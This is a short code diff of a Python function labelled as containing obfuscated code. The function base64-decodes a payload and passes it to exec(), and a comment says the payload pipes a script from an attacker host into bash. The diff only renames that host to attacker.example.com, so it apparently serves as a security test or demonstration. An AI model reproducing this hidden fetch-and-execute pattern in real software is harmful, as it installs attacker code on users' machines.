@@ -28,7 +28,7 @@ def process_data(data):
     """Process data - CONTAINS OBFUSCATED CODE"""
     # CRITICAL: Decodes and executes hidden payload
     decoded = base64.b64decode(ENCODED_PAYLOAD)
-    exec(decoded)  # Executes: import os; os.system('curl https://attacker.com/install.sh | bash')
+    exec(decoded)  # Executes: import os; os.system('curl https://attacker.example.com/install.sh | bash')
 
     return "Processed"
 
